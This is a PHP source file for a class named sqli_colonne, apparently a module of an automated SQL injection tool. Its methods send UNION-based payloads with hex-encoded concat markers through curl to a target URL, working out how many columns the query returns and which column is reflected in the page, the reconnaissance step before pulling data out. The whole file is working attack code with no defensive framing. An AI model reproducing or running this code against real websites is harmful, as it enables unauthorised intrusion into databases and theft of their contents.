<?php
class sqli_colonne
{
	function __construct()
	{
		$this->hr = new Curl();
		$this->ch = new chaine();
	}
    private $syntax_count = '9136665621.9';
    private $okstr = 'QUADCOREENGINE666';
    private $var_n = '[t]';
    private $hr;
    private $ch;

	public function Compter($param, $url_base, $union)
    {
        for ($p = 0; $p < count($param); $p++)
        {
            for ($i = 0; $i <= 60; $i++)
            {
                $url_curr = $url_base . $this->ch->ViderDernierParam($this->ch->genParamParIndex($param, 0, ($p + 1))) .
	                $this->ch->Encode(str_replace($this->var_n, $this->GenSynHex($i), $union)) .
	                $this->ch->genParamParIndex($param, $p + 1, count($param)
                );
                $page = $this->hr->get($url_curr);
                if (strpos($page, $this->syntax_count) !== false)
                {
                    return $i;
                }
            }
        }
        return 0;
    }
    public function FindColonneVise($url, $maxColonne)
    {
        $chkstr = 'concat(0x217e21,' . $this->var_n . ',0x217e21)';//concat(0x217e21,0x51554144434f5245454e47494e45363636,0x217e21)
        $url_f = '';
        $_url_base = explode('?', $url);
        $_url_base = $_url_base[0];
        $_url_params = explode('?', $url);
        $_url_params = '?' . $_url_params[1];

        for ($i = 1; $i <= $maxColonne + 1; $i++) {
            $param = $this->ch->Encode(str_replace($this->var_n, $this->ch->getHex($this->okstr), $chkstr));
			$url_f = str_replace(' ', '+', $_url_base . ( $this->str_replace_first($i, $param, $_url_params) ));
            $page = $this->hr->get($url_f);
            if (strpos($page, $this->okstr) !== false){
                return $i;
            }
            $page = '';
        }
        return -1;
    }
    private function GenSynHex($index)
    {
        $concat = '';
        for ($i = 0; $i <= $index; $i++)
		{
            $concat .= $this->ch->getHex($this->syntax_count) . ',';
		}
        return rtrim($concat, ',');;
    }
    protected function str_replace_first($from, $to, $subject)
    {
        $from = '/'.preg_quote($from, '/').'/';

        return preg_replace($from, $to, $subject, 1);
    }
}
